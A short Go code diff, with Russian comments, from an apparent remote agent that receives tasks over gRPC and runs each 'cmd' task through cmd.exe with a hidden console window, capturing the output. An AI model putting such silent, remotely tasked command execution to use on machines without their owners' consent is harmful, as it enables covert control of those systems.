@@ -116,9 +116,12 @@ func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
 	switch task.Type {
 	case "cmd":
 		// выполнение в cmd.exe
-		cmd := exec.Command("cmd", "/C", task.Command)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // скрываем консольное окно
-		out, err := cmd.CombinedOutput()                         // перехват вывода
+		cmd := exec.Command("cmd")
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+			CmdLine:    "cmd.exe /c " + task.Command,
+		}
+		out, err := cmd.CombinedOutput() // перехват вывода
 		errStr := ""
 		if err != nil {
 			errStr = err.Error()
